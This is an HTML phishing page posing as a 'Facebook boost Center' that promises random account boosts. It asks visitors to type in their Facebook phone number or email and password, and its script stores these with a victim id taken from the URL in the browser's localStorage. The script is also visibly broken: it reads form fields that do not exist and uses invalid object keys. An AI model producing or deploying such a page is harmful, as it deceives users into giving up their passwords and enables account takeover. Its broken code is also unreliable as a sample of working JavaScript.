<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>TDE Facebook Center</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Poppins',sans-serif;
}

body{
background:#f5f7ff;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
padding:20px;
}

.card{
width:100%;
max-width:420px;
background:white;
padding:30px;
border-radius:25px;
box-shadow:0 10px 40px rgba(0,0,0,0.08);
}

h1{
font-size:28px;
margin-bottom:10px;
text-align:center;
color:#1877f2;
}

p{
text-align:center;
font-size:14px;
color:#666;
margin-bottom:25px;
}

input,
textarea{
width:100%;
padding:15px;
border:none;
background:#f2f4ff;
border-radius:15px;
margin-bottom:20px;
font-size:15px;
outline:none;
}

textarea{
height:40px;
resize:none;
}

button{
width:100%;
padding:15px;
border:none;
border-radius:15px;
background:#1877f2;
color:white;
font-size:16px;
font-weight:600;
cursor:pointer;
}

.success{
display:none;
text-align:center;
}

</style>
</head>

<body>

<div class="card">

<div id="formPage">

<h1>Welcome to Facebook boost Center</h1>

<p>Input your details below</p>

<p>Note account get boosted with random amount above 50</p>

<input type="text" id="Phone number/email" placeholder="Input your phone number or email">

<textarea id="Password" placeholder="Input your Password"></textarea>

<button onclick="submitForm()">
Finish
</button>

</div>

<div class="success" id="successPage">

<h2>Sent Successfully 🎉</h2>

<p>Your account will get boosted with random amount</p>

</div>

</div>

<script>

const params =
new URLSearchParams(window.location.search);

const userID = params.get("id");

function submitForm(){

let name =
document.getElementById("name").value;

let note =
document.getElementById("note").value;

if(name.trim()==="" || note.trim()===""){

alert("Fill all fields");
return;

}

let feedback = {

platform:"Facebook",

id:userID,

phone number/email:phone number/email,

Password:Password,

time:new Date().toLocaleTimeString()

};

localStorage.setItem(
"userFeed_" + userID,
JSON.stringify(feedback)
);

document.getElementById("formPage")
.style.display="none";

document.getElementById("successPage")
.style.display="block";

}

</script>

</body>
</html>
